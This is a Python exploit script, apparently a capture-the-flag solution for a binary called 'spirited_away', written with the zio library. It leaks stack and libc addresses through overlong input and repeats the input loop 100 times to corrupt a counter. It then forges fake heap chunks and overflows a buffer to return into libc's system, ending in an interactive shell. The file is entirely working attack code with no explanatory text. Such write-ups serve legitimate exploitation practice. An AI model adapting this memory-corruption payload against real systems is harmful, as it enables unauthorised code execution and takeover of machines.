#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from time import sleep

conn = ("./spirited_away")
io = zio(conn, print_write = COLORED(RAW, "yellow"), print_read = COLORED(RAW, "red"))

if __name__ == "__main__":
    io.read_until("name: ")
    io.write("M4x")
    io.read_until("age: ")
    io.writeline(str(0x21212121))
    #  DEBUG()
    io.read_until("movie? ")
    io.write("0" * 0x50)
    io.read_until("comment: ")
    io.write("c" * 0x3c)
    survryEbp = b32(io.read_until("\xff")[-4: ][::-1])
    print "[*] survryEbp -> {:#x}".format(survryEbp)
    libcBase = b32(io.read_until("\xf7")[-4: ][::-1]) - 0x1b3d60
    print "[*] libcBase -> {:#x}".format(libcBase)
    for i in xrange(100):
        io.read_until("<y/n>: ")
        io.write("y")
        io.read_until("name: ")
        io.write("0" * 0x3c)
        io.read_until("age: ")
        io.writeline(str(0x21212121))
        io.read_until("movie? ")
        io.write("1" * 0x50)
        io.read_until("comment: ")
        io.write("2" * 0x3c)
        print "\n[*] %d" % i

    io.read_until("<y/n>: ")
    io.write("y")
    io.read_until("name: ")
    io.write("n" * 0x3c)
    io.read_until("age: ")
    io.writeline(str(0x21212121))

    reason = l32(0) + l32(0x41) + 'r' * 56 + l32(0) + l32(0x41)
    io.read_until("movie? ")
    io.write(reason)

    comment = 'c' * 0x50 + '2121' + l32(survryEbp - 0x68) + l32(0) + l32(0x41)
    io.read_until("comment: ")
    io.write(comment)

    io.read_until("<y/n>: ")
    io.write("y")

    payload = 'a' * (0x48 + 4) + l32(libcBase + 0x3ab30) + 'aaaa' + l32(libcBase + 0x15cdc8)
    io.read_until("name: ")
    io.write(payload)
    io.read_until("age: ")
    io.writeline(str(0x21212121))
    io.read_until("movie? ")
    io.write("hos")
    io.read_until("comment: ")
    io.write("hos")
    io.read_until("<y/n>: ")
    io.write("n")

    print "[*] SHELL"
    io.interact()
    io.close()
